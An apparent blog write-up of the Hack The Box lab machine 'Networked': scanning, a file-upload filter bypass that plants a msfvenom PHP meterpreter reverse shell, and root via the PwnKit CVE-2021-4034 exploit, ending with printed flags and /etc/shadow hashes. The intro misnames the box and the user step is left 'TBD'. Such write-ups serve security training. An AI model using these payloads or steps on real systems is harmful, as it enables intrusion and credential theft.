---
title: "HTB: Networked Writeup"
date: 2021-06-17T23:36:00-07:00
categories:
  - blog
  - writeup
  - htb
tags:
  - htb
  - htb easy
  - offsec
---

There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!

---

# Enumeration
This began with an nmap scan
```bash
$ nmap -sC -sV 10.10.10.146
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-30 14:50 EDT
Nmap scan report for 10.10.10.146
Host is up (0.69s latency).
Not shown: 806 filtered tcp ports (no-response), 191 filtered tcp ports (host-unreach)
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
443/tcp closed https

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 218.17 seconds
```

From these ports, the only really interesting one is 80. We also have a bit of info, the machine is running CentOS and PHP 5.4.16.

## Port 80
Beginning with a gobuster scan:

```bash
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://10.10.10.146 -x php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.146
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2022/06/30 14:59:20 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 229]
/lib.php              (Status: 200) [Size: 0]  
/uploads              (Status: 301) [Size: 236] [--> http://10.10.10.146/uploads/]
/backup               (Status: 301) [Size: 235] [--> http://10.10.10.146/backup/] 
/upload.php           (Status: 200) [Size: 169]                                   
/photos.php           (Status: 200) [Size: 5980]                                  
/.                    (Status: 200) [Size: 229]
```

The scan lists a few interesting files, it looks like there's an `upload.php` that may be of interest to us. Additionally, there's a `backup` directory. Taking a look at the backup directory, I can see `backup.tar` listed there, which is the source code of the PHP files!

Looking through the PHP files, it looks like `upload.php` will receive input from the user as an uploaded file then validate that it's a valid file with `check_file_type`
```php
if (!(check_file_type($_FILES["myFile"]) && filesize($_FILES['myFile']['tmp_name']) < 60000)) {
  echo '<pre>Invalid image file.</pre>';
  displayform();
}
```

The `check_file_type` function will obtain the MIME of the file and check if it contains `image/`.
```php
function check_file_type($file) {
  $mime_type = file_mime_type($file);
  if (strpos($mime_type, 'image/') === 0) {
      return true;
  } else {
      return false;
  }  
}
```

Next, once the file validates the MIME type, it next checks the file extension:
```php
list ($foo,$ext) = getnameUpload($myFile["name"]);
$validext = array('.jpg', '.png', '.gif', '.jpeg');
$valid = false;
foreach ($validext as $vext) {
  if (substr_compare($myFile["name"], $vext, -strlen($vext)) === 0) {
    $valid = true;
  }
}
```

So the uploaded file must have one of the image extensions and a valid MIME type.

From here, I spent a lot of time trying to bypass the file extension check to upload an image with a `.php` extension. I tried many things such as using `jhead` to modify a JPG file and inserting a NULL byte into the uploaded filename (e.g. `shell.php\x00.jpg`). But I was unable to bypass this file extension filter. After a while of trying on this "easy" box, I finally gave up and look at the ippsec video where he went over the box and he simply uploaded it WITH the image extension, and the webserver still executed it as PHP code. Why didn't I think of trying to see if the image executed as PHP??

Next, crafting the payload PHP script:
```bash
$ echo -n "GIF8;" > payload.php.gif
$ msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 >> payload.php.gif
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 1111 bytes
```

The above creates a file with the GIF magic number (`GIF8;`), and appends a PHP payload on to the image with a reverse meterpreter payload. 

Next, we must set up a listener to catch the callback when we receive it.
```bash
$ msfconsole -q -x "use exploit/multi/handler; set payload php/meterpreter/reverse_tcp; set lhost 10.10.14.5; set lport 8080; run"
[*] Using configured payload generic/shell_reverse_tcp
payload => php/meterpreter/reverse_tcp
lhost => 10.10.14.5
lport => 8080
[*] Started reverse TCP handler on 10.10.14.5:8080 
[*] Sending stage (39927 bytes) to 10.10.10.146
[*] Meterpreter session 1 opened (10.10.14.5:8080 -> 10.10.10.146:36816) at 2022-06-30 14:26:53 -0400
```

Finally, uploading the `payload.php.gif` and then accessing it via the web browser was able to callback to our listener and give us an interactive shell.

# Privesc - User
TBD

# Privesc - Root
I'm not certain if this is the intended way to obtain root, but when I ran linpeas, it reported that this machine is vulnerable to CVE-2021-4034. That exploit has a [POC posted on github](https://github.com/arthepsy/CVE-2021-4034), however that POC requires compiling with gcc and we do not have gcc on the target machine. That did not pose a problem though, on my local machine I downloaded the POC and compiled it, it does internally use GCC again, so I compiled two versions of it.

```bash
$ wget https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/main/cve-2021-4034-poc.c
$ gcc cve-2021-4034-poc.c -o cve-2021-4034-poc
$ sed -i 's:execve:// execve:g' cve-2021-4034-poc.c
$ gcc cve-2021-4034-poc.c -o cve-2021-4034-poc-setup
$ ./cve-2021-4034-poc-setup
$ tar cf - pwnkit | gzip -9 > pwnkit.tgz
$ sudo python3 -m http.server 80
```

Now, back in our shell:
```bash
meterpreter > shell
cd /tmp
curl 10.10.14.5/pwnkit.tgz -O pwnkit.tgz
tar xf pwnkit.tgz
curl 10.10.14.5/cve-2021-4034-poc -O cve-2021-4034-poc
chmod +x cve-*
./cve-2021-4034-poc
whoami
root
cat /home/g*/user.txt
526cfc2305f17faaacecf212c57d71c5
cat /root/root.txt
0a8ecda83f1d81251099e8ac3d0dcb82
cat /etc/shadow
root:$6$wRmoL66y$Lz9oA82o1iDwKwJjhUwuGhuOakrYdclnbsJ/K9OQF40hMNk0UDoxtTqQ1UnC8SzLyZ8sujxQjhT/gvmkOfoJZ1:18079:0:99999:7:::
guly:$6$eKNFoPNC$HlNBvdf0mFXswJ7xRZFaBQgfo0gR626ui/1rydhlIih/PEqDI8ZsrHUsET1y93GtydanJBwl82eGO8Iw0JJM90:18079:0:99999:7:::
```

And that's it, we're now root.
